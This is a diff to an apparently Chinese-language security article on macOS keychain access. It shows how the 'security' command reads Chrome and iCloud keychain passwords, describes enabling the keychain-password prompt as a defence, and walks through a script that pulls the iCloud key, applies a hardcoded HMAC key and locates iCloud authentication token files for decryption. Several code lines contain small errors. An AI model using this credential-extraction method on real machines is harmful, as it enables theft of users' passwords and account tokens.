@@ -53,7 +53,7 @@ $ security find-generic-password -ga 'Chrome'
 这里的参数解释如下：
 
 * **find-generic-password** 命令参数，是使用“查找密码”的功能。
-* **-a**，这个参数是匹配之后提供的账户，用于过滤。
+* **-a**，这个参数是匹配类型为“账户”的，用于过滤。
 * **-g**，这个参数是将查询到的密码显示出来。
 
 运行这个命令后，系统马上就会弹出一个提示框，如下：
@@ -62,4 +62,126 @@ $ security find-generic-password -ga 'Chrome'
 
 
 
+那么到这里，只要用户点击了“允许”按钮，那么就可以马上得到存储在keychain里面的密钥了。如下：
+
+![](https://ws2.sinaimg.cn/large/006tKfTcgy1fhblsp9swej30zg0ngtd0.jpg)
+
+这里security请求钥匙串访问的权限，用户点击“允许”后，就能读取到相应的password。
+
+假如有人未经你允许擅动你电脑，这个时候就可以轻而易举的窃取了你密码。
+
+当然，如果是远程的恶意黑客，那么有可能会无限次弹出弹窗提示，直至逼到你点击“允许”按钮为止。
+
+那我们该如何防范这种情况呢？请往下看。
+
+
+
 #### 当用户开启了“询问钥匙串密码”选项
+
+我们回到刚刚keychain 里面那个chrome safe storage的条目，右键选择**显示简介**。
+
+切换到**访问控制**的面板，将**询问钥匙串密码**选中。
+
+![](https://ws3.sinaimg.cn/large/006tKfTcgy1fhblzkxuz7j30ty0jkgnl.jpg)
+
+
+
+这里有另外一个小bug，就是keychain里面的更改需要重复两次操作，才能真正的修改成功，当我们勾选了这个选项，切换到*属性*然后再切换回来的时候，发现这个选项又没有被选中，需要再重复操作一遍才行。
+
+然后我们回到命令行，重新输入上面security的命令，这一次我们发现弹窗出来不一样了。这里需要我们输入钥匙串密码。
+
+![](https://ws4.sinaimg.cn/large/006tKfTcgy1fhbm32ymorj30oe0b8tao.jpg)
+
+所以当我们开启了这个选项，就算别人偷偷用你的电脑，没有你的钥匙串密码，也无法得到其中的安全信息。这里就多了一道防护。
+
+
+
+以上的操作步骤，我们主要对是否开启钥匙串密码的安全性做一点讨论。接下来我们要使用脚本来自动获取密码，并且结合系统的神秘小钥匙，用来解密我们iCloud条目里面的Token。
+
+
+
+## MMeToenDecrypt.py 解析
+
+先引入所需要的库。
+
+```python
+import base64, hashlib, hmac, subprocess, sys, glob, os, binasicc
+from Foundation import NSData, NSPropertyListSerialization
+```
+
+* base64用来加密iCloud的钥匙。
+* hashlib用于计算md5
+* subprocess用于fork一个子进程，并运行一个外部程序。
+
+
+
+按照上面的方法，使用security命令获取iCloud条目的密码。
+
+```Shell
+security find-generic-password -ws 'iCloud'
+```
+
+* -w 参数是用于仅显示密码项。
+* -s 参数是用于指定类型为server的条目，并匹配后面的关键词。
+
+在python里面，我们可以是subprocess库来运行外部程序，将shell环境下命令运行的结果返回到本程序。如果没有获取到，则打印报错信息，再退出程序。
+
+```python
+iCloudKey = subprocess.check_output("security find-generic-password -ws 'iCloud' | awk {'print $1'}", shell=True).replace("\n", "")
+if iCloudKey == "":
+    print "Error getting iCloud Decryption Key"
+    sys.exit()
+```
+
+得到iCloud的密码后，我们将其进行base64编码
+
+```python
+msg = base64.b64decode(iCloudKey)
+```
+
+接下来上场的是我们那把神秘的小钥匙了。
+
+它在所有的Macos版本里面都用于生成Hmac哈希。它是用于解密的关键。
+
+在位于**/System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit**路径下的系统库，执行了下面的方法，调用了CCHmac来生成一个Hmac，用于解密秘钥。
+
+```swift
+KeychainAccountStorage _generateKeyFromData:
+```
+
+```python
+key = "t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"
+```
+
+将上面得到的iCloudKey和系统神秘钥匙使用hmac进行md5计算。
+
+并将我们得到的哈希值进行16进制转换。
+
+```python
+hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()
+hexedKey = binascii.hexlify(hashed)
+```
+
+我们知道用户的授权Token都存放在**~/Library/Application Support/iCloud/Accounts/** 下，所以要遍历一下该文件夹下面的文件，判断是否为我们所需要的DSID文件。
+
+```python
+mmeTokenFile = glob.glob("%s/Library/Application Support/iCloud/Account/*" % os.path.expanduser("~"))
+for x in mmeTokenFile:
+    try:
+        int(x.split("/")[-1])
+        mmeTokenFile = x
+    except:
+        continue
+if not isinstance(mmeTokenFile, str):
+    print"Could not find MMeTokenFile. You can specify the file manually"
+  	sys.exit()
+else:
+    print "Decrypting token plist -> [%s]\n" % mmeTokenFile
+```
+
+
+
+
+
+
+
